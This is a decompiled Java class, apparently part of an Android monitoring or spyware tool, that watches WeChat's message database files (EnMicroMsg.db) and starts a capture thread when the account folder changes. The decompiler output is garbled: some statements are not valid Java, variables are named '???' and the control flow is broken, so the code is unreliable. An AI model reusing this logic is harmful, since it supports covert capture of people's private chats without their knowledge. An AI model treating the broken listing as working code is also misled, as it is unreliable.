package com.vvt.capture.wechat.b;

import com.vvt.base.capture.e;
import com.vvt.base.capture.i;
import com.vvt.capture.wechat.d;
import com.vvt.io.p;
import com.vvt.n.a.g;
import java.util.ArrayList;
import java.util.Iterator;

public class a implements e, com.vvt.n.a.a, g {
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.d;
  private static final boolean c = com.vvt.ak.a.e;
  private boolean d;
  private String e;
  private String f;
  private String g;
  private Thread h;
  private i i;
  private com.vvt.n.a.b j;
  private ArrayList k;
  
  public a(String paramString, com.vvt.n.a.b paramb)
  {
    this.e = paramString;
    this.j = paramb;
    this.d = false;
    this.f = "";
    this.g = "";
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.k = localArrayList;
  }
  
  private String d(String paramString)
  {
    boolean bool1 = false;
    String str1 = com.vvt.capture.wechat.b.a();
    boolean bool2 = a;
    if (bool2) {}
    bool2 = com.vvt.ag.b.a(str1);
    if (!bool2)
    {
      String str2 = this.g;
      bool2 = com.vvt.ag.b.a(str2);
      if (!bool2)
      {
        str2 = this.g;
        bool2 = str1.equals(str2);
        if (!bool2)
        {
          bool2 = a;
          if (bool2) {}
          str2 = this.g;
          str2 = p.a(p.a(paramString, str2), "EnMicroMsg.db");
          this.j.a(str2);
          str2 = this.g;
          str2 = p.a(p.a(paramString, str2), "EnMicroMsg2.db");
          com.vvt.n.a.b localb = this.j;
          localb.a(str2);
        }
      }
      this.g = str1;
      str1 = d.a(str1);
      bool2 = com.vvt.ag.b.a(str1);
      if (!bool2)
      {
        bool1 = a;
        if (!bool1) {}
      }
    }
    for (;;)
    {
      return str1;
      str1 = null;
    }
  }
  
  public void a(i parami)
  {
    boolean bool = a;
    if (bool) {}
    bool = this.d;
    if (!bool)
    {
      bool = true;
      this.d = bool;
      this.i = parami;
      Object localObject1 = this.j;
      if (localObject1 == null) {
        break label128;
      }
      synchronized (this.k)
      {
        localObject1 = com.vvt.capture.wechat.b.b();
        this.k = ((ArrayList)localObject1);
        localObject1 = this.k;
        Iterator localIterator = ((ArrayList)localObject1).iterator();
        bool = localIterator.hasNext();
        if (bool)
        {
          localObject1 = localIterator.next();
          localObject1 = (String)localObject1;
          com.vvt.n.a.b localb = this.j;
          localb.a((String)localObject1, this);
        }
      }
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      label128:
      bool = c;
      if (!bool) {}
    }
  }
  
  public void a(String paramString)
  {
    boolean bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
    Thread localThread = this.h;
    if (localThread == null)
    {
      localThread = new java/lang/Thread;
      b localb = new com/vvt/capture/wechat/b/b;
      localb.<init>(this);
      localThread.<init>(localb);
      this.h = localThread;
      localThread = this.h;
      localThread.start();
    }
    bool = a;
    if (bool) {}
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    bool = this.d;
    if (bool)
    {
      this.d = false;
      bool = false;
      this.i = null;
      Object localObject1 = this.j;
      if (localObject1 != null)
      {
        synchronized (this.k)
        {
          localObject1 = this.k;
          if (localObject1 != null)
          {
            localObject1 = this.k;
            Iterator localIterator = ((ArrayList)localObject1).iterator();
            bool = localIterator.hasNext();
            if (bool)
            {
              localObject1 = localIterator.next();
              localObject1 = (String)localObject1;
              com.vvt.n.a.b localb = this.j;
              localb.a((String)localObject1);
            }
          }
        }
        Object localObject3 = this.f;
        bool = com.vvt.ag.b.a((String)localObject3);
        if (!bool)
        {
          localObject3 = this.j;
          ??? = this.f;
          ((com.vvt.n.a.b)localObject3).a((String)???);
        }
      }
    }
    bool = a;
    if (bool) {}
  }
  
  public void b(String paramString)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    String str = d(paramString);
    bool1 = com.vvt.ag.b.a(str);
    if (!bool1)
    {
      synchronized (this.k)
      {
        Object localObject1 = this.k;
        if (localObject1 != null)
        {
          localObject1 = this.k;
          Iterator localIterator = ((ArrayList)localObject1).iterator();
          do
          {
            bool1 = localIterator.hasNext();
            if (!bool1) {
              break;
            }
            localObject1 = localIterator.next();
            localObject1 = (String)localObject1;
            bool2 = ((String)localObject1).equals(paramString);
          } while (bool2);
          boolean bool2 = b;
          if (bool2) {}
          Object localObject4 = this.j;
          ((com.vvt.n.a.b)localObject4).a((String)localObject1);
          localObject4 = this.k;
          ((ArrayList)localObject4).remove(localObject1);
        }
      }
      Object localObject3 = this.f;
      bool1 = ((String)localObject3).equals(str);
      if (!bool1)
      {
        this.f = str;
        bool1 = a;
        if (bool1) {}
        localObject3 = this.j;
        if (localObject3 != null)
        {
          localObject3 = this.j;
          ((com.vvt.n.a.b)localObject3).a(str, this);
        }
      }
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return;
      bool1 = b;
      if (!bool1) {}
    }
  }
  
  public void c(String paramString) {}
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/wechat/removeFromPath/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */